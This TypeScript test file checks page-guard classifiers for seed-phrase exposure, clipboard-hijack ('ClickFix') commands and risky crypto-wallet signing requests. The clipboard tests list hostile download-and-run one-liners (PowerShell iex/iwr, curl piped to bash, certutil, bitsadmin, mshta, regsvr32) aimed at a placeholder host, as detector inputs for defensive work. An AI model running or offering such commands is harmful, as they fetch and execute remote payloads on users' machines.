import { createHash } from "node:crypto";
import { readFileSync } from "node:fs";
import { describe, expect, it } from "vitest";
import { classifyClickFix, clickFixCopy } from "../src/guards/clickfix.js";
import { abiSelector, keccak256Hex } from "../src/guards/keccak.js";
import { BIP39_ENGLISH, BIP39_ENGLISH_SHA256, findSeedPhrase, seedGuardCopy } from "../src/guards/seed-phrase.js";
import { sha256Hex } from "../src/guards/sha256.js";
import { classifyWalletRequest, walletGuardCopy } from "../src/guards/wallet-request.js";

const PHRASES = {
  12: "abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about",
  15: "abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon address",
  18: "abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon agent",
  21: "abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon admit",
  24: "abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon art",
} as const;

const SPENDER = "0x1111111111111111111111111111111111111111";
const OTHER = "0x2222222222222222222222222222222222222222";

function utf8(text: string): Uint8Array {
  return new Uint8Array(Buffer.from(text));
}

function word(value: string): string {
  return value.replace(/^0x/, "").toLowerCase().padStart(64, "0");
}

function call(selector: string, words: string[]): string {
  return `0x${selector}${words.join("")}`;
}

describe("page guard classifiers", () => {
  it("matches the SHA-256 and Keccak test vectors", () => {
    expect(sha256Hex(utf8(""))).toBe("e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855");
    expect(sha256Hex(utf8("abc"))).toBe("ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad");
    expect(keccak256Hex(utf8(""))).toBe("c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470");
    expect(abiSelector("approve(address,uint256)")).toBe("095ea7b3");
    expect(abiSelector("setApprovalForAll(address,bool)")).toBe("a22cb465");
  });

  it("checks the official BIP39 English wordlist hash and checksum", () => {
    const file = new URL("../data/bip39-english.txt", import.meta.url);
    const pin = new URL("../data/bip39-english.sha256", import.meta.url);
    const bytes = readFileSync(file);
    const pinned = readFileSync(pin, "utf8").trim().split("\n").at(-1);
    expect(createHash("sha256").update(bytes).digest("hex")).toBe(BIP39_ENGLISH_SHA256);
    expect(pinned).toBe(BIP39_ENGLISH_SHA256);
    expect(bytes.toString("utf8").replace(/\n$/, "").split("\n")).toEqual([...BIP39_ENGLISH]);
    expect(BIP39_ENGLISH).toHaveLength(2048);
    expect(BIP39_ENGLISH[0]).toBe("abandon");
    expect(BIP39_ENGLISH[2047]).toBe("zoo");
    for (const phrase of Object.values(PHRASES)) {
      expect(findSeedPhrase(phrase)).toEqual({ count: phrase.split(" ").length });
      expect(findSeedPhrase(`  ${phrase.toUpperCase().replaceAll(" ", "\n")}  `)?.count).toBe(phrase.split(" ").length);
    }
    expect(findSeedPhrase("abandon amount liar amount expire adjust cage candy arch gather drum buyer")?.count).toBe(12);
    const broken = PHRASES[12].replace(/about$/, "abandon");
    expect(findSeedPhrase(broken)).toBeNull();
    expect(findSeedPhrase(PHRASES[12].split(" ").slice(0, 11).join(" "))).toBeNull();
    expect(findSeedPhrase(`${PHRASES[12]} abandon`)).toBeNull();
    expect(findSeedPhrase("the quick brown fox jumps over the lazy dog again now")).toBeNull();
    const copy = seedGuardCopy(12);
    expect(copy.body).toContain("12-word");
    expect(copy.body.toLowerCase()).not.toContain("abandon");
    expect(copy.body.toLowerCase()).not.toContain("about");
    expect(JSON.stringify(findSeedPhrase(PHRASES[24]))).not.toContain("abandon");
  });

  it("flags shell and Run-dialog clipboard text and ignores prose", () => {
    expect(classifyClickFix("powershell -w hidden -enc SQBFAFgA").kind).toBe("powershell");
    expect(classifyClickFix("powershell.exe -NoP -C \"iex (iwr http://example.invalid/a)\"").kind).toBe("powershell");
    expect(classifyClickFix("mshta http://example.invalid/a.hta").kind).toBe("mshta");
    expect(classifyClickFix("cmd /c calc").kind).toBe("cmd");
    expect(classifyClickFix("echo a | base64 -d | sh").kind).toBe("base64-shell");
    expect(classifyClickFix("curl -fsSL http://example.invalid/a | bash").kind).toBe("pipe-shell");
    expect(classifyClickFix("certutil -urlcache -split -f http://example.invalid/a.exe a.exe").kind).toBe("certutil");
    expect(classifyClickFix("bitsadmin /transfer job http://example.invalid/a.exe a.exe").kind).toBe("bitsadmin");
    expect(classifyClickFix("rundll32 javascript:alert(1)").kind).toBe("rundll32");
    expect(classifyClickFix("regsvr32 /s /n /u /i:http://example.invalid/a scrobj.dll").kind).toBe("regsvr32");
    expect(classifyClickFix("msiexec /i http://example.invalid/a.msi /q").kind).toBe("msiexec");
    expect(classifyClickFix("wscript http://example.invalid/a.js").kind).toBe("script-host");
    const encoded = Buffer.from("powershell -nop -c calc", "utf16le").toString("base64");
    expect(classifyClickFix(encoded).kind).toBe("base64-blob");
    expect(classifyClickFix("Open PowerShell from the Start menu.").risky).toBe(false);
    expect(classifyClickFix("curl http://example.invalid/readme.txt").risky).toBe(false);
    expect(classifyClickFix("The mshta documentation is long.").risky).toBe(false);
    expect(classifyClickFix("").risky).toBe(false);
    expect(clickFixCopy("powershell").body).not.toContain("SQBFAFgA");
  });

  it("flags risky EIP-1193 requests and lets a known finite approval through", () => {
    expect(classifyWalletRequest({ method: "eth_sign", params: [SPENDER, "0x" + "ab".repeat(32)] }).reasons).toEqual(["eth_sign"]);
    expect(classifyWalletRequest({ method: "personal_sign", params: ["0x01", SPENDER] }).risky).toBe(false);
    expect(classifyWalletRequest({ method: "eth_call", params: [{ to: SPENDER, data: "0x" }] }).risky).toBe(false);

    const unlimited = call("095ea7b3", [word(SPENDER), "f".repeat(64)]);
    const finite = call("095ea7b3", [word(SPENDER), word("0x01")]);
    const all = call("a22cb465", [word(OTHER), word("0x01")]);
    const revoke = call("a22cb465", [word(OTHER), word("0x00")]);
    expect(classifyWalletRequest({ method: "eth_sendTransaction", params: [{ data: unlimited }] }).reasons).toEqual(["unlimited_approve", "unknown_spender"]);
    expect(classifyWalletRequest({ method: "eth_sendTransaction", params: [{ data: finite }] }).reasons).toEqual(["unknown_spender"]);
    expect(classifyWalletRequest({ method: "eth_sendTransaction", params: [{ data: finite }] }, [SPENDER]).risky).toBe(false);
    expect(classifyWalletRequest({ method: "eth_sendTransaction", params: [{ data: unlimited }] }, [SPENDER]).reasons).toEqual(["unlimited_approve"]);
    expect(classifyWalletRequest({ method: "wallet_sendCalls", params: [{ calls: [{ data: all }] }] }).reasons).toEqual(["set_approval_for_all", "unknown_spender"]);
    expect(classifyWalletRequest({ method: "eth_sendTransaction", params: [{ data: revoke }] }).risky).toBe(false);

    const permit = {
      types: { Permit: [{ name: "spender", type: "address" }, { name: "value", type: "uint256" }] },
      primaryType: "Permit",
      domain: { name: "Token", version: "1" },
      message: { spender: SPENDER, value: "1" },
    };
    const permit2 = {
      types: { PermitSingle: [{ name: "spender", type: "address" }] },
      primaryType: "PermitSingle",
      domain: { name: "Permit2" },
      message: { spender: OTHER },
    };
    expect(classifyWalletRequest({ method: "eth_signTypedData_v4", params: [SPENDER, JSON.stringify(permit)] }).reasons).toEqual(["permit", "unknown_spender"]);
    expect(classifyWalletRequest({ method: "eth_signTypedData_v4", params: [SPENDER, permit2] }).reasons).toEqual(["permit2", "unknown_spender"]);
    const copy = walletGuardCopy({ reasons: ["eth_sign"], spender: undefined });
    expect(copy.body).toContain("raw hash");
    expect(copy.body).not.toContain("ab".repeat(8));
    expect(copy.rememberLabel).toBeUndefined();
  });
});
